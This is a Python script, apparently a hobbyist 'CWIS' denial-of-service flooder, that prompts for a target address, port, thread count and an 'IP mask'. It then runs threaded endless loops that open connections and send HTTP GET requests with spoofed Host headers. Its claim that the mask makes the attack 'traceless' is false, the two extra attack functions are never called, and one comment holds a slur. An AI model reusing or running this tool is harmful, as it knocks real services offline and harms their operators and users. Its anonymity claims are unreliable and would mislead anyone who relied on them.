__author__ = 'JonesBBQ -- K!CK M3 Team'

import socket
import threading
import time
import random
import struct
import sys
import os


class color:  #########fix this color class (might not even be my fault maybe some gay terminal stuff)
    pass


print("""\n
██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
█                                                                                                                                                                        █
█                    ██████╗██╗    ██╗██╗███████╗                                                                                                                        █
█                   ██╔════╝██║    ██║██║██╔════╝                                                                                                                        █
█                   ██║     ██║ █╗ ██║██║███████╗                                                                                                                        █
█                   ██║     ██║███╗██║██║╚════██║                                                                                                                        █
█                   ╚██████╗╚███╔███╔╝██║███████║                                                                                                                        █
█                    ╚═════╝ ╚══╝╚══╝ ╚═╝╚══════╝                                                                                                                        █
██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████    
    """)

git_rep = 'https://github.com/chilloxop/kick.git'   #github page
git_proj = 'https://github.com/chilloxop/kick/blob/master/CWIS.py'  #github source code for CWIS
rep_oc = 0  # just means repeated stuff and prints numbers out. weird variable names huh?
print('\nVersion 1.3   --------------    By JonesBBQ at the K!CK M3 Team      ')
print('Check out the github repo here: ' + git_rep)
print('Source code here: ' + git_proj)
time.sleep(3)
target = input('\nEnter target IP address     ||it can be a http url||     : ')  #because awesome dns conversion or what ever does it
port = int(input('\nEnter port of target : '))
ip_mask = input('\nEnter IP mask    ||makes your attack traceless||   : ')  # not fully anonymous note: make it better
num_thread = int(input('\nEnter number of threads          ||25 is decent depending on pc power||              : '))
time.sleep(1)
print('\nIt will print a number depending on your thread options')
ip_mask_sec1 = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
ip_mask_sec2 = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

def main_attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, int(port)))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + ip_mask + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global rep_oc

        rep_oc += 1  # look at line 10
        if rep_oc % 500 == 0:     #every 500 hits it prints it
            print(rep_oc)


for i in range(num_thread):
    thread = threading.Thread(target=main_attack)
    thread.start()




def sec_attack1():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, int(port)))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + ip_mask_sec1 + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global rep_oc

        rep_oc += 1  # look at line 10
        if rep_oc % 500 == 0:     #every 500 hits it prints it
            print(rep_oc)


def sec_attack2():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, int(port)))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + ip_mask_sec2 + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global rep_oc

        rep_oc += 1  # look at line 10
        if rep_oc % 500 == 0:     #every 500 hits it prints it
            print(rep_oc)




















